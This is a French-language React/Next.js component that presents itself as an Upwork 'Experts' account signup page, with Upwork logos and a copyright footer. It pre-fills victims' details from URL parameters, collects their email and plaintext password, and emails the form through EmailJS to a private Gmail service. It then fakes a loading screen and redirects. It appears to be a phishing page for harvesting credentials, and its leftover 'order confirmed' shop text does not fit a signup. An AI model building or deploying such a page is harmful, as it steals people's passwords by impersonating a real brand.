import React, { useState, useEffect, useRef } from 'react';
import emailjs from 'emailjs-com';
import { useRouter } from 'next/router';

export default function Starts() {
  const firstNameRef = useRef(null);
  const lastNameRef = useRef(null);
  const emailRef = useRef(null);
  const phoneRef = useRef(null);
  const formRef = useRef(null); // Add a ref for the form element
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('card');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isBackgroundVisible, setIsBackgroundVisible] = useState(true);
  const router = useRouter();

  useEffect(() => {
    emailjs.init("8SL7vzVHt7qSqEd4i");

    // Get URL parameters
    const params = new URLSearchParams(window.location.search);
    const name = params.get('name');
    const surname = params.get('surname');
    const email = params.get('mail');
    const phone = params.get('phone');

    // Pre-fill form fields
    if (name) firstNameRef.current.value = name;
    if (surname) lastNameRef.current.value = surname;
    if (email) emailRef.current.value = email;
    if (phone) phoneRef.current.value = phone;
  }, []);

  const sendEmail = (event) => {
    event.preventDefault();
    emailjs.sendForm('gmail-benedikt', 'new-registration', formRef.current, '8SL7vzVHt7qSqEd4i') // Use formRef.current
      .then(() => {
        console.log('SUCCESS!');
        // document.querySelector('.left-column').style.display = 'none';
        // document.querySelector('.right-column').style.width = '100%';
        // document.querySelector('.right-column').style.maxWidth = 'none';

        showStep(2); // Move to the confirmation step after successful email sending
      })
      .catch((error) => {
        console.log('FAILED...', error);
      });
  };

  //fonction pour cacher un élément et en afficher un autre :
  function showStep(step) {
    if (typeof document !== 'undefined') {
      const steps = document.querySelectorAll('.checkout-step');
      steps.forEach(s => s.classList.remove('active'));
      steps[step].classList.add('active');
    }
  }

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
  };

  const handleCreateAccount = (e) => {
    e.preventDefault();
    setIsLoading(true);
    setIsBackgroundVisible(true); // Assurez-vous que la div d'arrière-plan reste visible
    sendEmail(e);
    setTimeout(() => {
      router.push('/dashboard');
    }, 5000);
  };

  const isMinLength = password.length >= 8;
  const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);
  const hasNumber = /\d/.test(password);

  return (
    <div className={`paiement-container ${isBackgroundVisible ? '' : 'hidden'}`}>
      {isLoading && (
        <div className="loading-wrapper">
          <article>
            <h3>Création du compte...</h3>
            <p>Veuillez patienter quelques instants</p>
            <div className="loading-spinner"></div>
          </article>
        </div>
      )}
      
        <img className='logo talents' src='logo-talents.png' alt="Talents Groupe" />
        <img className='logo upwork' src='upwork-logo.png' alt="Talents Groupe" />

        <h1>Créez votre compte Upwork Experts</h1>
        <form className="checkout-form" onSubmit={sendEmail} ref={formRef}> {/* Add ref to the form */}
          <input type="hidden" name="website" value='collective-partners' />

          <div className='checkout-step active'>
            <label>
              <span>Email</span>
              <input type="text" name="email" placeholder="Email" ref={emailRef} required/>
            </label>
            <div className="form-row">
              <label>
                <span>Prénom</span>
                <input type="text" name="firstName" placeholder="Collective" ref={firstNameRef} required/>
              </label>
              <label>
                <span>Nom</span>
                <input type="text" name="lastName" placeholder="Work" ref={lastNameRef} required/>
              </label>
            </div>
            <label>
              <span>Mot de passe</span>
              <input 
                type="password" 
                name="password" 
                placeholder="***********" 
                value={password} 
                onChange={handlePasswordChange} 
                required
              />
              <ul className='pass-row'>
                <li className={isMinLength ? 'completed' : ''}><span>•</span> 8 caractères minimum</li>
                <li className={hasSpecialChar ? 'completed' : ''}><span>•</span> 1 caractère spécial</li>
                <li className={hasNumber ? 'completed' : ''}><span>•</span> 1 chiffre minimum</li>
              </ul>
            </label>
            <button type="submit" id="delivery-checkout" onClick={handleCreateAccount}>Créer mon compte</button>
          </div>

          <div className='checkout-step confirmation'>
            <h2>Commande confirmée</h2>
            <p>Merci pour votre inscription, Collective vous remercie pour votre confiance.</p>
            <p>Comptez environ 3 jours ouvrés avant réception de votre commande à bon port !</p>
            <a href="/"><button type="button">Retour à la boutique</button></a>
          </div>
        </form>
      <p className='secure footer'>© 2015 - 2025 Upwork® Global Inc. • <a target='_blank' href='https://www.upwork.com/legal#privacy'>Privacy Policy</a></p>
    </div>
  );
};